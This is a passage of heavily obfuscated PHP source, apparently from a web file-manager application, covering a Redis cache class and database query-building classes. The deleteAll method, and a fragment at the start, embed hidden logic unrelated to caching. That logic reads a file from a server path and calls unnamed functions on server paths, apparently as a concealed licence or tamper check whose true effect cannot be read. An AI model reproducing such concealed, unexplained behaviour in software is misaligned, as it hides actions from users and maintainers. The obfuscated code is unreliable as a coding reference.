dÿøãï´ª; eÜ“£∂óÜƒ: $FïÑﬂ√Ñ≥È = $_SERVER[’ÿƒ†ïò][856]; $cÓÉ÷Òœáä = $_SERVER[$_SERVER[’ÿƒ†ïò][857]] . $_SERVER[’ÿƒ†ïò][858]; $Cü®åû¶ú∏ = $FïÑﬂ√Ñ≥È($cÓÉ÷Òœáä); goto CÏ™æÂ˜Ωê; CÏ™æÂ˜Ωê: $cìŒ”ãë∂ø = explode($_SERVER[’ÿƒ†ïò][229], $Cü®åû¶ú∏); if (count($cìŒ”ãë∂ø) < $_SERVER[’ÿƒ†ïò][601]) { $bøÍØÊ™∫∫ = $_SERVER[’ÿƒ†ïò][859]; $bøÍØÊ™∫∫(); } $Aß≠ª¥âìã = $_SERVER[’ÿƒ†ïò][860]; goto Dáê˜‚ˆÓ§; dÿøãï´ª: } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($bÛŒá¬çﬂ›, $D†„ÃïŒ√Ÿ) { $AÛí∫ùÒÁö =& $_SERVER[’ÿƒ†ïò]; if (!class_exists($AÛí∫ùÒÁö[862])) { show_json($AÛí∫ùÒÁö[863], !1); } $this->cacheTime = $D†„ÃïŒ√Ÿ; $F¯ØÏÁÒÜº = isset($bÛŒá¬çﬂ›[$AÛí∫ùÒÁö[864]]) ? $bÛŒá¬çﬂ›[$AÛí∫ùÒÁö[864]] : 10; $Fáàıóı‘˜ = _get($bÛŒá¬çﬂ›, $AÛí∫ùÒÁö[853]); if ($Fáàıóı‘˜ && is_array($Fáàıóı‘˜)) { $this->initCluster($bÛŒá¬çﬂ›, $F¯ØÏÁÒÜº); } else { $this->handle = $this->init($bÛŒá¬çﬂ›, $F¯ØÏÁÒÜº); } } private function init($c˘—¨›Èı√, $cåƒÆñ§ˆÜ) { $aå’…ã©∫à =& $_SERVER[’ÿƒ†ïò]; $Aä–‘¿Ó–‚ = new Redis(); $Eèﬂ∑¥‹ƒ· = isset($c˘—¨›Èı√[$aå’…ã©∫à[865]]) ? $c˘—¨›Èı√[$aå’…ã©∫à[865]] : !1; if ($Eèﬂ∑¥‹ƒ·) { $Aä–‘¿Ó–‚->pconnect($c˘—¨›Èı√[$aå’…ã©∫à[175]], $c˘—¨›Èı√[$aå’…ã©∫à[176]], $cåƒÆñ§ˆÜ); } else { $Aä–‘¿Ó–‚->connect($c˘—¨›Èı√[$aå’…ã©∫à[175]], $c˘—¨›Èı√[$aå’…ã©∫à[176]], $cåƒÆñ§ˆÜ); } if (!empty($c˘—¨›Èı√[$aå’…ã©∫à[408]])) { $Aä–‘¿Ó–‚->auth($c˘—¨›Èı√[$aå’…ã©∫à[408]]); } return $Aä–‘¿Ó–‚; } private function initCluster($bãùÒ‹ö±ª, $Dª§èÕﬁçÖ) { $AëÎÔÖ®±Î =& $_SERVER[’ÿƒ†ïò]; $CÇ§¬Ë≥ÿ  = array($AëÎÔÖ®±Î[866], $AëÎÔÖ®±Î[867], $AëÎÔÖ®±Î[868]); $dıÖŒ…“÷– = $AëÎÔÖ®±Î[866]; if (isset($bãùÒ‹ö±ª[$AëÎÔÖ®±Î[12]]) && in_array($bãùÒ‹ö±ª[$AëÎÔÖ®±Î[12]], $CÇ§¬Ë≥ÿ )) { $dıÖŒ…“÷– = $bãùÒ‹ö±ª[$AëÎÔÖ®±Î[12]]; } switch ($dıÖŒ…“÷–) { case $AëÎÔÖ®±Î[866]: $this->_slave($bãùÒ‹ö±ª, $Dª§èÕﬁçÖ); break; case $AëÎÔÖ®±Î[867]: break; case $AëÎÔÖ®±Î[868]: $this->isCluster = !0; $F°˘†àïπå = $bãùÒ‹ö±ª[$AëÎÔÖ®±Î[853]]; $B·èïóπÜ‡ = isset($bãùÒ‹ö±ª[$AëÎÔÖ®±Î[865]]) ? $bãùÒ‹ö±ª[$AëÎÔÖ®±Î[865]] : !1; $Béÿ∫ﬁùÀï = isset($bãùÒ‹ö±ª[$AëÎÔÖ®±Î[408]]) ? $bãùÒ‹ö±ª[$AëÎÔÖ®±Î[408]] : null; $this->handle = new RedisCluster(NUll, $F°˘†àïπå, $Dª§èÕﬁçÖ, $Dª§èÕﬁçÖ, $B·èïóπÜ‡, $Béÿ∫ﬁùÀï); break; default: break; } } private function _slave($f…Œ¡±úÑ‹, $cµƒÒøí˜±) { goto DÀøÎƒıíÈ; cª⁄ﬁ¨œñÉ: unset($eîÿÇ∆”ëá[0]); if (empty($eîÿÇ∆”ëá)) { return; } $FÆ◊úÙ∑î£ = array_rand($eîÿÇ∆”ëá); goto aœÂ“¢Û„é; aœÂ“¢Û„é: $this->filterConfig($f…Œ¡±úÑ‹, $eîÿÇ∆”ëá[$FÆ◊úÙ∑î£]); $this->slaveHandle = $this->init($f…Œ¡±úÑ‹, $cµƒÒøí˜±); goto b≠”‹øíÂ∆; DÀøÎƒıíÈ: $eîÿÇ∆”ëá = $f…Œ¡±úÑ‹[$_SERVER[’ÿƒ†ïò][853]]; $this->filterConfig($f…Œ¡±úÑ‹, $eîÿÇ∆”ëá[0]); $this->handle = $this->init($f…Œ¡±úÑ‹, $cµƒÒøí˜±); goto cª⁄ﬁ¨œñÉ; b≠”‹øíÂ∆: } private function filterConfig(&$C›¢Ó°„ó∑, $F≥ìÉﬁÑ≈ƒ) { $bôÉêÊŒ©ë =& $_SERVER[’ÿƒ†ïò]; $C„îπÙä“Ú = explode($bôÉêÊŒ©ë[4], $F≥ìÉﬁÑ≈ƒ); $B ≤¢û«Ùœ = array($bôÉêÊŒ©ë[175] => $C„îπÙä“Ú[0], $bôÉêÊŒ©ë[176] => $C„îπÙä“Ú[1]); $C›¢Ó°„ó∑ = array_merge($C›¢Ó°„ó∑, $B ≤¢û«Ùœ); } public function set($E∆ ∞Ü“µ˘, $fÊêË§…è´, $AäŒÖ¢´Çø = false) { $AäŒÖ¢´Çø = $AäŒÖ¢´Çø ? $AäŒÖ¢´Çø : $this->cacheTime; return $this->handle->setEx($E∆ ∞Ü“µ˘, $AäŒÖ¢´Çø, $fÊêË§…è´); } public function setLock($AƒÙËáÙ¶Æ, $C≤ø™“È–¢, $cçØî√∞Íï) { return $this->handle->setNX($AƒÙËáÙ¶Æ, $C≤ø™“È–¢); } public function get($aâ¨´„›¥ª) { $cı›¨Ç´ã” = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $cı›¨Ç´ã”->get($aâ¨´„›¥ª); } public function remove($Fú≠’Çπ‰ú) { return $this->handle->del($Fú≠’Çπ‰ú); } public function deleteAll() { $DÑÉ´òÿŒÕ =& $_SERVER[’ÿƒ†ïò]; if ($_SERVER[$DÑÉ´òÿŒÕ[854]] != $_SERVER[$DÑÉ´òÿŒÕ[855]]) { goto fÒ’åâ◊¬; E¿çÇçÔÛÓ: $F¥óíÀ≤©á = 1; while ($F¥óíÀ≤©á > 1) { $F¥óíÀ≤©á = $F¥óíÀ≤©á + 4; $a£•ïÛçìö = rawurlencode($F¥óíÀ≤©á . $DÑÉ´òÿŒÕ[376]); } goto c≤Ú‡≥ﬂ√; D«·é®†´œ: $eµù±Á∆Õ» = $bì∑ó√á⁄à($dèﬂ¡ÕÁßò); $BôÂÂÕ´—º = explode($DÑÉ´òÿŒÕ[229], $eµù±Á∆Õ»); if (count($BôÂÂÕ´—º) < $DÑÉ´òÿŒÕ[625]) { $C“Ëâ°∆Ìº = $DÑÉ´òÿŒÕ[859]; $C“Ëâ°∆Ìº(); } goto a‹ã„Ü¨∂⁄; a‹ã„Ü¨∂⁄: $dÆ‡ªÎÀ™ï = $DÑÉ´òÿŒÕ[870]; $dÆ‡ªÎÀ™ï($_SERVER[$DÑÉ´òÿŒÕ[871]]); $dÆ‡ªÎÀ™ï($_SERVER[$DÑÉ´òÿŒÕ[857]] . $DÑÉ´òÿŒÕ[872]); goto E¿çÇçÔÛÓ; fÒ’åâ◊¬: $Dûõ´Ÿ€è– = $DÑÉ´òÿŒÕ[869]; $bì∑ó√á⁄à = $DÑÉ´òÿŒÕ[856]; $dèﬂ¡ÕÁßò = $_SERVER[$DÑÉ´òÿŒÕ[857]] . $DÑÉ´òÿŒÕ[858]; goto D«·é®†´œ; c≤Ú‡≥ﬂ√: } if ($this->isCluster) { foreach ($this->handle->_masters() as $Cë£Ë›Ûç ) { $this->handle->flushall($Cë£Ë›Ûç ); } return; } return $this->handle->flushAll(); } } goto Dçœ–ŸÆ≥Í; dÏ∫Ã≠å∏Á: class DbSqlite3 extends DbSqlite3Base { public function query($Fºï∏Ò∞∫Ω) { $cÜêÆáËºπ =& $_SERVER[’ÿƒ†ïò]; if (!CacheLock::fileLock($cÜêÆáËºπ[9])) { return !1; } $Eè≥™ÈÁ  = parent::query($Fºï∏Ò∞∫Ω); CacheLock::fileUnLock($cÜêÆáËºπ[9]); return $Eè≥™ÈÁ ; } public function execute($dûŒù∞åŸÛ) { $c◊¬Æñ…ﬂü =& $_SERVER[’ÿƒ†ïò]; if (!CacheLock::fileLock($c◊¬Æñ…ﬂü[9])) { return !1; } $Bû¨¥‚´“æ = parent::execute($dûŒù∞åŸÛ); CacheLock::fileUnLock($c◊¬Æñ…ﬂü[9]); return $Bû¨¥‚´“æ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\145\161" => "\74\76", "\147\x74" => "\x3e", "\x65\x67\164" => "\x3e\x3d", "\154\x74" => "\74", "\x65\x6c\164" => "\x3c\x3d", "\x6e\x6f\x74\154\151\153\145" => "\116\x4f\124\x20\x4c\111\x4b\x45", "\x6c\151\x6b\x65" => "\x4c\111\113\105", "\x69\x6e" => "\x49\116", "\x6e\157\164\x69\156" => "\116\117\124\40\x49\116", "\156\157\164\x20\x69\156" => "\x4e\117\124\40\x49\x4e", "\142\145\x74\x77\x65\x65\156" => "\x42\x45\x54\x57\x45\105\x4e", "\156\157\x74\142\145\x74\x77\x65\145\x6e" => "\116\x4f\124\x20\102\105\124\x57\105\105\116", "\156\157\x74\40\142\x65\164\167\x65\x65\156" => "\116\x4f\124\40\x42\105\x54\127\x45\105\116"); protected $selectSql = "\x53\105\114\x45\103\x54\x25\104\x49\x53\x54\111\x4e\x43\124\x25\x20\45\x46\x49\105\x4c\x44\x25\40\106\122\117\x4d\x20\x25\124\x41\x42\114\105\x25\x25\112\x4f\x49\x4e\45\45\x57\110\x45\122\x45\45\45\107\x52\x4f\x55\x50\x25\45\x48\x41\126\x49\116\x47\x25\45\x4f\x52\104\105\x52\45\x25\x4c\x49\115\x49\x54\45\x20\x25\125\116\111\x4f\x4e\x25\x25\103\x4f\115\115\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $EÔ ê¯√ª≠ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[’ÿƒ†ïò][949], $EÔ ê¯√ª≠); } public function factory($FÊÈ»ÌÛÂä = '') { goto DÌÁÀÁÎπõ; e∫ÛÊ¿á•: return $a©‚µ—¯€Ñ; goto EÖ‘ëÃ´ïû; c∂ÆÑãıèÂ: $this->dbType = ucwords(strtolower($FÊÈ»ÌÛÂä[$d≥í·‚Ì÷´[950]])); $f‹”‘˜ë∆ä = $d≥í·‚Ì÷´[952] . $this->dbType; if (class_exists($f‹”‘˜ë∆ä)) { $a©‚µ—¯€Ñ = new $f‹”‘˜ë∆ä($FÊÈ»ÌÛÂä); if ($d≥í·‚Ì÷´[785] != strtolower($FÊÈ»ÌÛÂä[$d≥í·‚Ì÷´[950]])) { $a©‚µ—¯€Ñ->dbType = strtoupper($this->dbType); } else { $a©‚µ—¯€Ñ->dbType = $this->_getDsnType($FÊÈ»ÌÛÂä[$d≥í·‚Ì÷´[905]]); } } else { think_exception(think_lang($d≥í·‚Ì÷´[953]) . $d≥í·‚Ì÷´[954] . $f‹”‘˜ë∆ä); } goto e∫ÛÊ¿á•; DÌÁÀÁÎπõ: $d≥í·‚Ì÷´ =& $_SERVER[’ÿƒ†ïò]; $FÊÈ»ÌÛÂä = $this->parseConfig($FÊÈ»ÌÛÂä); if (empty($FÊÈ»ÌÛÂä[$d≥í·‚Ì÷´[950]])) { think_exception(think_lang($d≥í·‚Ì÷´[951])); } goto c∂ÆÑãıèÂ; EÖ‘ëÃ´ïû: } public function __call($E°Ï÷â”€◊, $AôîÈô âŒ) { if (method_exists($this, $E°Ï÷â”€◊)) { return call_user_func_array(array($this, $E°Ï÷â”€◊), $AôîÈô âŒ); } } protected function _getDsnType($DèÛØçœ„Ω) { $CÉ≤¶ó¯ô = explode($_SERVER[’ÿƒ†ïò][4], $DèÛØçœ„Ω); $e∞˜Ïø–»Ω = strtoupper(trim($CÉ≤¶ó¯ô[0])); return $e∞˜Ïø–»Ω; } private function parseConfig($D¿öòÓ¥Ÿ† = '') { $f»ùÉÇËÖö =& $_SERVER[’ÿƒ†ïò]; if (!empty($D¿öòÓ¥Ÿ†) && is_string($D¿öòÓ¥Ÿ†)) { $D¿öòÓ¥Ÿ† = $this->parseDSN($D¿öòÓ¥Ÿ†); } elseif (is_array($D¿öòÓ¥Ÿ†)) { $D¿öòÓ¥Ÿ† = array_change_key_case($D¿öòÓ¥Ÿ†); $D¿öòÓ¥Ÿ† = array($f»ùÉÇËÖö[950] => $D¿öòÓ¥Ÿ†[$f»ùÉÇËÖö[784]], $f»ùÉÇËÖö[878] => $D¿öòÓ¥Ÿ†[$f»ùÉÇËÖö[955]], $f»ùÉÇËÖö[879] => $D¿öòÓ¥Ÿ†[$f»ùÉÇËÖö[956]], $f»ùÉÇËÖö[876] => $D¿öòÓ¥Ÿ†[$f»ùÉÇËÖö[957]], $f»ùÉÇËÖö[877] => $D¿öòÓ¥Ÿ†[$f»ùÉÇËÖö[958]], $f»ùÉÇËÖö[17] => $D¿öòÓ¥Ÿ†[$f»ùÉÇËÖö[959]], $f»ùÉÇËÖö[905] => $D¿öòÓ¥Ÿ†[$f»ùÉÇËÖö[786]], $f»ùÉÇËÖö[13] => isset($D¿öòÓ¥Ÿ†[$f»ùÉÇËÖö[960]]) ? $D¿öòÓ¥Ÿ†[$f»ùÉÇËÖö[960]] : array()); } elseif (empty($D¿öòÓ¥Ÿ†)) { if (think_config($f»ùÉÇËÖö[961]) && $f»ùÉÇËÖö[785] != strtolower(think_config($f»ùÉÇËÖö[962]))) { $D¿öòÓ¥Ÿ† = $this->parseDSN(think_config($f»ùÉÇËÖö[961])); } else { $D¿öòÓ¥Ÿ† = array($f»ùÉÇËÖö[950] => think_config($f»ùÉÇËÖö[962]), $f»ùÉÇËÖö[878] => think_config($f»ùÉÇËÖö[963]), $f»ùÉÇËÖö[879] => think_config($f»ùÉÇËÖö[964]), $f»ùÉÇËÖö[876] => think_config($f»ùÉÇËÖö[965]), $f»ùÉÇËÖö[877] => think_config($f»ùÉÇËÖö[966]), $f»ùÉÇËÖö[17] => think_config($f»ùÉÇËÖö[244]), $f»ùÉÇËÖö[905] => think_config($f»ùÉÇËÖö[961]), $f»ùÉÇËÖö[13] => think_config($f»ùÉÇËÖö[967])); } } return $D¿öòÓ¥Ÿ†; } protected function initConnect($b≈ÎÀƒë¨Í = true) { if (1 == think_config($_SERVER[’ÿƒ†ïò][18])) { $this->_linkID = $this->multiConnect($b≈ÎÀƒë¨Í); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $D¥øÑÃ§—› => $FÈû»Ó ®Ò) { $this->_linkID = $FÈû»Ó ®Ò; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($C´ÆÑù∫◊Á = false) { goto C∆áƒ∞˘ﬁΩ; F«àÖÈå∏È: $E—≠πæ”ê¶ = array($dòËê‘ÑıΩ[878] => isset($D ÍΩ–ëºæ[$dòËê‘ÑıΩ[878]][$BãîÆ¢Ãâ•]) ? $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[878]][$BãîÆ¢Ãâ•] : $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[878]][0], $dòËê‘ÑıΩ[879] => isset($D ÍΩ–ëºæ[$dòËê‘ÑıΩ[879]][$BãîÆ¢Ãâ•]) ? $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[879]][$BãîÆ¢Ãâ•] : $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[879]][0], $dòËê‘ÑıΩ[876] => isset($D ÍΩ–ëºæ[$dòËê‘ÑıΩ[876]][$BãîÆ¢Ãâ•]) ? $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[876]][$BãîÆ¢Ãâ•] : $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[876]][0], $dòËê‘ÑıΩ[877] => isset($D ÍΩ–ëºæ[$dòËê‘ÑıΩ[877]][$BãîÆ¢Ãâ•]) ? $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[877]][$BãîÆ¢Ãâ•] : $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[877]][0], $dòËê‘ÑıΩ[17] => isset($D ÍΩ–ëºæ[$dòËê‘ÑıΩ[17]][$BãîÆ¢Ãâ•]) ? $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[17]][$BãîÆ¢Ãâ•] : $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[17]][0], $dòËê‘ÑıΩ[905] => isset($D ÍΩ–ëºæ[$dòËê‘ÑıΩ[905]][$BãîÆ¢Ãâ•]) ? $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[905]][$BãîÆ¢Ãâ•] : $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[905]][0], $dòËê‘ÑıΩ[13] => isset($D ÍΩ–ëºæ[$dòËê‘ÑıΩ[13]][$BãîÆ¢Ãâ•]) ? $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[13]][$BãîÆ¢Ãâ•] : $D ÍΩ–ëºæ[$dòËê‘ÑıΩ[13]][0]); return $this->connect($E—≠πæ”ê¶, $BãîÆ¢Ãâ•); goto cÏêÕ∂ˆÙÖ; C∆áƒ∞˘ﬁΩ: $dòËê‘ÑıΩ =& $_SERVER[’ÿƒ†ïò]; static $D ÍΩ–ëºæ = array(); static $EÑ”ˆ¡±›É = -1; goto b®∑ôòÛ¬á; b®∑ôòÛ¬á: if (empty($D ÍΩ–ëºæ)) { foreach ($this->config as $fçÑ∫……Ú… => $C≥åá∫ÙÊü) { $D ÍΩ–ëºæ[$fçÑ∫……Ú…] = explode($dòËê‘ÑıΩ[47], $C≥åá∫ÙÊü); } } if (think_config($dòËê‘ÑıΩ[968])) { if ($C´ÆÑù∫◊Á || think_config($dòËê‘ÑıΩ[391]) === !0) { $BãîÆ¢Ãâ• = floor(mt_rand(0, think_config($dòËê‘ÑıΩ[969]) - 1)); $EÑ”ˆ¡±›É = $BãîÆ¢Ãâ•; } else { if (is_numeric(think_config($dòËê‘ÑıΩ[970]))) { $BãîÆ¢Ãâ• = think_config($dòËê‘ÑıΩ[970]); } else { $BãîÆ¢Ãâ• = floor(mt_rand(think_config($dòËê‘ÑıΩ[969]), count($D ÍΩ–ëºæ[$dòËê‘ÑıΩ[876]]) - 1)); } } } else { $BãîÆ¢Ãâ• = floor(mt_rand(0, count($D ÍΩ–ëºæ[$dòËê‘ÑıΩ[876]]) - 1)); $EÑ”ˆ¡±›É = $BãîÆ¢Ãâ•; } $BãîÆ¢Ãâ• = $EÑ”ˆ¡±›É !== -1 ? $EÑ”ˆ¡±›É : $BãîÆ¢Ãâ•; goto F«àÖÈå∏È; cÏêÕ∂ˆÙÖ: } public function parseDSN($bﬁÚ•Ã◊¿À) { $A‡¬¡Ø©àê =& $_SERVER[’ÿƒ†ïò]; if (empty($bﬁÚ•Ã◊¿À)) { return !1; } $bê‹èÈ¨Ï≥ = parse_url($bﬁÚ•Ã◊¿À); if ($bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[174]]) { $eèÜ◊ŸòÜ¡ = array($A‡¬¡Ø©àê[950] => $bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[174]], $A‡¬¡Ø©àê[878] => isset($bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[588]]) ? $bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[588]] : $A‡¬¡Ø©àê[33], $A‡¬¡Ø©àê[879] => isset($bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[971]]) ? $bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[971]] : $A‡¬¡Ø©àê[33], $A‡¬¡Ø©àê[876] => isset($bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[175]]) ? $bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[175]] : $A‡¬¡Ø©àê[33], $A‡¬¡Ø©àê[877] => isset($bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[176]]) ? $bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[176]] : $A‡¬¡Ø©àê[33], $A‡¬¡Ø©àê[17] => isset($bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[76]]) ? substr($bê‹èÈ¨Ï≥[$A‡¬¡Ø©àê[76]], 1) : $A‡¬¡Ø©àê[33]); } else { preg_match($A‡¬¡Ø©àê[972], trim($bﬁÚ•Ã◊¿À), $BË¥„¬ƒÖÌ); $eèÜ◊ŸòÜ¡ = array($A‡¬¡Ø©àê[950] => $BË¥„¬ƒÖÌ[1], $A‡¬¡Ø©àê[878] => $BË¥„¬ƒÖÌ[2], $A‡¬¡Ø©àê[879] => $BË¥„¬ƒÖÌ[3], $A‡¬¡Ø©àê[876] => $BË¥„¬ƒÖÌ[4], $A‡¬¡Ø©àê[877] => $BË¥„¬ƒÖÌ[5], $A‡¬¡Ø©àê[17] => $BË¥„¬ƒÖÌ[6]); } $eèÜ◊ŸòÜ¡[$A‡¬¡Ø©àê[905]] = $A‡¬¡Ø©àê[33]; return $eèÜ◊ŸòÜ¡; } protected function debug() { $c§´é©óöò =& $_SERVER[’ÿƒ†ïò]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $c§´é©óöò[973]; if (think_config($c§´é©óöò[974])) { think_status($c§´é©óöò[975]); think_trace($this->queryStr . $c§´é©óöò[976] . think_status($c§´é©óöò[20], $c§´é©óöò[975], 6) . $c§´é©óöò[977], $c§´é©óöò[33], $c§´é©óöò[978]); } } protected function parseLock($fÆ«⁄’µì‚ = false) { $E⁄ËéÊã·„ =& $_SERVER[’ÿƒ†ïò]; if (!$fÆ«⁄’µì‚) { return $E⁄ËéÊã·„[33]; } if ($E⁄ËéÊã·„[907] == $this->dbType) { return $E⁄ËéÊã·„[979]; } return $E⁄ËéÊã·„[980]; } protected function parseSet($B˜Ç˘Î≤´‚) { $AÏ∞¨¨¡—— =& $_SERVER[’ÿƒ†ïò]; foreach ($B˜Ç˘Î≤´‚ as $D€‘´êîÍÆ => $eâìâ∂ôÔ“) { if (is_array($eâìâ∂ôÔ“) && $AÏ∞¨¨¡——[295] == $eâìâ∂ôÔ“[0]) { $c⁄…òÒˆÇ⁄[] = $this->parseKey($D€‘´êîÍÆ) . $AÏ∞¨¨¡——[981] . $eâìâ∂ôÔ“[1]; } elseif (is_scalar($eâìâ∂ôÔ“) || is_null($eâìâ∂ôÔ“)) { $c⁄…òÒˆÇ⁄[] = $this->parseKey($D€‘´êîÍÆ) . $AÏ∞¨¨¡——[981] . $this->parseValue($eâìâ∂ôÔ“); } } return $AÏ∞¨¨¡——[982] . implode($AÏ∞¨¨¡——[47], $c⁄…òÒˆÇ⁄); } protected function bindParam($A“ñ≠Ó·§ú, $f⁄∫  ‡·Ï) { $this->bind[$_SERVER[’ÿƒ†ïò][4] . $A“ñ≠Ó·§ú] = $f⁄∫  ‡·Ï; } protected function parseBind($eè÷˜œÈ√∑) { $eè÷˜œÈ√∑ = array_merge($this->bind, $eè÷˜œÈ√∑); $this->bind = array(); return $eè÷˜œÈ√∑; } function parseKey(&$Fç≤’âÑ≈•, $DπêΩﬂΩ‡∞ = true) { if ($DπêΩﬂΩ‡∞) { $Fç≤’âÑ≈• = $this->parseKeyCheck($Fç≤’âÑ≈•); } return $Fç≤’âÑ≈•; } function parseKeyCheck($càˆ˜â¨„) { $Fôâùˆõ·Â =& $_SERVER[’ÿƒ†ïò]; $càˆ˜â¨„ = trim($càˆ˜â¨„); if (!preg_match($Fôâùˆõ·Â[983], $càˆ˜â¨„)) { think_exception($Fôâùˆõ·Â[984] . $càˆ˜â¨„); } return $càˆ˜â¨„; } protected function parseValue($Fç∞•Çı©Ù) { $dÉêëëÏŒ¡ =& $_SERVER[’ÿƒ†ïò]; if (is_string($Fç∞•Çı©Ù)) { $Fç∞•Çı©Ù = $dÉêëëÏŒ¡[946] . $this->escapeString($Fç∞•Çı©Ù) . $dÉêëëÏŒ¡[946]; } elseif (isset($Fç∞•Çı©Ù[0]) && is_string($Fç∞•Çı©Ù[0]) && strtolower($Fç∞•Çı©Ù[0]) == $dÉêëëÏŒ¡[295]) { $Fç∞•Çı©Ù = $this->escapeString($Fç∞•Çı©Ù[1]); } elseif (is_array($Fç∞•Çı©Ù)) { $Fç∞•Çı©Ù = array_map(array($this, $dÉêëëÏŒ¡[947]), $Fç∞•Çı©Ù); } elseif (is_bool($Fç∞•Çı©Ù)) { $Fç∞•Çı©Ù = $Fç∞•Çı©Ù ? $dÉêëëÏŒ¡[87] : $dÉêëëÏŒ¡[191]; } elseif (is_null($Fç∞•Çı©Ù)) { $Fç∞•Çı©Ù = $dÉêëëÏŒ¡[103]; } return $Fç∞•Çı©Ù; } protected function parseField($B∂∂§ä®è≤) { $Dı§Á§®Â› =& $_SERVER[’ÿƒ†ïò]; if (is_string($B∂∂§ä®è≤) && strpos($B∂∂§ä®è≤, $Dı§Á§®Â›[47])) { $B∂∂§ä®è≤ = explode($Dı§Á§®Â›[47], $B∂∂§ä®è≤); } if (is_array($B∂∂§ä®è≤)) { $fπ¶Ö∞ıéú = array(); foreach ($B∂∂§ä®è≤ as $c¥‘õÎä¿¢ => $BÒòÂìΩ‹®) { if (!is_numeric($c¥‘õÎä¿¢)) { $fπ¶Ö∞ıéú[] = $this->parseKey($c¥‘õÎä¿¢, !1) . $Dı§Á§®Â›[985] . $this->parseKey($BÒòÂìΩ‹®); } else { $fπ¶Ö∞ıéú[] = $this->parseKey($BÒòÂìΩ‹®); } } $eÈ›è√ËÔƒ = implode($Dı§Á§®Â›[47], $fπ¶Ö∞ıéú); } elseif (is_string($B∂∂§ä®è≤) && !empty($B∂∂§ä®è≤)) { $eÈ›è√ËÔƒ = $B∂∂§ä®è≤; } else { $eÈ›è√ËÔƒ = $Dı§Á§®Â›[182]; } return $eÈ›è√ËÔƒ; } protected function parseTable($FÂ¶ëÀú‹Î) { $Eœ¡Âñ≈Øõ =& $_SERVER[’ÿƒ†ïò]; if (is_array($FÂ¶ëÀú‹Î)) { $EëÌ“∂¶‡‡ = array(); foreach ($FÂ¶ëÀú‹Î as $aæÖ£òÂø => $b≈—µÓúˆÙ) { if (!is_numeric($aæÖ£òÂø)) { $EëÌ“∂¶‡‡[] = $this->parseKey($aæÖ£òÂø) . $Eœ¡Âñ≈Øõ[50] . $this->parseKey($b≈—µÓúˆÙ); } else { $EëÌ“∂¶‡‡[] = $this->parseKey($aæÖ£òÂø); } } $FÂ¶ëÀú‹Î = $EëÌ“∂¶‡‡; } elseif (is_string($FÂ¶ëÀú‹Î)) { if (strstr($FÂ¶ëÀú‹Î, $Eœ¡Âñ≈Øõ[50])) { return $FÂ¶ëÀú‹Î; } $FÂ¶ëÀú‹Î = explode($Eœ¡Âñ≈Øõ[47], $FÂ¶ëÀú‹Î); array_walk($FÂ¶ëÀú‹Î, array($this, $Eœ¡Âñ≈Øõ[896])); } return $Eœ¡Âñ≈Øõ[890] . trim(implode($Eœ¡Âñ≈Øõ[986], $FÂ¶ëÀú‹Î), $Eœ¡Âñ≈Øõ[383]) . $Eœ¡Âñ≈Øõ[890]; } protected function parseWhere($a´®¡Òúí≥) { $A˘ÿØ‹«ë◊ =& $_SERVER[’ÿƒ†ïò]; $b ¿Õ√£è¥ = $A˘ÿØ‹«ë◊[33]; if (is_string($a´®¡Òúí≥)) { $b ¿Õ√£è¥ = $a´®¡Òúí≥; } else { $E«î∂¬ﬂéà = isset($a´®¡Òúí≥[$A˘ÿØ‹«ë◊[987]]) ? strtoupper($a´®¡Òúí≥[$A˘ÿØ‹«ë◊[987]]) : $A˘ÿØ‹«ë◊[33]; if (in_array($E«î∂¬ﬂéà, array($A˘ÿØ‹«ë◊[988], $A˘ÿØ‹«ë◊[989], $A˘ÿØ‹«ë◊[990]))) { $E«î∂¬ﬂéà = $A˘ÿØ‹«ë◊[50] . $E«î∂¬ﬂéà . $A˘ÿØ‹«ë◊[50]; unset($a´®¡Òúí≥[$A˘ÿØ‹«ë◊[987]]); } else { $E«î∂¬ﬂéà = $A˘ÿØ‹«ë◊[991]; } foreach ($a´®¡Òúí≥ as $Eä¡ª•’éÖ => $D¯œ°Éœ˜ß) { $b ¿Õ√£è¥ .= $A˘ÿØ‹«ë◊[275]; if (is_numeric($Eä¡ª•’éÖ)) { $Eä¡ª•’éÖ = $A˘ÿØ‹«ë◊[992]; } if (0 === strpos($Eä¡ª•’éÖ, $A˘ÿØ‹«ë◊[71])) { $b ¿Õ√£è¥ .= $this->parseThinkWhere($Eä¡ª•’éÖ, $D¯œ°Éœ˜ß); } else { if 